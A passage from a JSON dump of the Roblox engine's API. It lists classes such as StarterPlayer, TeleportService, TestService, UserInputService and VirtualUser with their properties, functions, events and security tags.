ener","tags":[],"Class":"SoundService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":["notCreatable"]},{"ValueType":"double","type":"Property","Name":"MinReportInterval","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ValueType":"string","type":"Property","Name":"ReporterType","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"Dictionary","Name":"data","Default":null}],"Name":"Report","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportJobsStepWindow","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"includeJobs","Default":"false"}],"Name":"ReportTaskScheduler","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetReportUrl","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"ProfilingItem","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"double","Name":"window","Default":"0"}],"Name":"GetTimes","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"frames","Default":"1"}],"Name":"GetTimesForFrames","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"StudioTool","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"StudioTool"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"StudioTool","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusive","Default":"true"},{"Type":"double","Name":"fps","Default":"30"}],"Name":"AddDummyJob","tags":["LocalUserSecurity"],"Class":"TaskScheduler","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"timeSlice","Default":null},{"Type":"int","Name":"numShare","Default":null}],"Name":"SetThreadShare","tags":["LocalUserSecurity","deprecated"],"Class":"TaskScheduler","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"ReturnType":"bool","Arguments":[{"Name":"message","Type":"string"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"ConfirmationCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"ReturnType":"void","Arguments":[{"Name":"message","Type":"string"}],"Name":"ErrorCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRegion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":["notCreatable"]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":["RobloxScriptSecurity"],"Class":"TextService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"ImageUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"VideoUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void